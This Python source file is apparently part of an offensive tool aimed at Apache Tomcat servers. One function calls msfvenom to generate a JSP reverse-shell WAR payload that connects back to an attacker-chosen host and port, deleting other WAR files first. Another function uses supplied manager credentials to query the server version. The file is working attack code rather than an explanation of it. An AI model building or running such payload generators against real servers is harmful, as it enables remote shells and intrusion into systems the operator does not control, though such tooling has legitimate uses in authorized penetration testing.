import glob
import os
import subprocess
import requests
from requests.auth import HTTPBasicAuth

from jerrycat import output_class

output = output_class()

def generate_payload(filename: str, lhost: str, lport: str) -> str:
    resources_path = os.path.abspath("resources")
    print(resources_path)

    war_files = glob.glob(os.path.join(resources_path, "*.war"))

    for war_file in war_files:
        if not 'web_shell.war' in war_file:
            os.remove(war_file)

    subprocess.run(
        ["msfvenom", "-p", "java/jsp_shell_reverse_tcp", f"LHOST={lhost}", f"LPORT={lport}",
         "-f", "war", "-o", f"{filename}.war"], cwd=resources_path, check=True, capture_output=True)

    return filename


def version_detection(url, **kwargs):

    if 'username' in kwargs and 'password' in kwargs:
        username = kwargs.get('username')
        password = kwargs.get('password')

        auth = HTTPBasicAuth(username, password)

        endpoint = '/manager/text/serverinfo'
        response = requests.get(f"{url}{endpoint}", auth=auth)

        if response.status_code == 200:
            info_dict = {}

            lines = response.text.splitlines()

            for line in lines[1:]:

                key, value = line.split(":", 1)
                key = key.strip()
                value = value.strip().strip('[]')
                info_dict[key] = value

            if 'Tomcat Version' in info_dict:
                output.message("info", f"{info_dict['Tomcat Version']}", False)

    # make an else statement for an unauthenticated version detection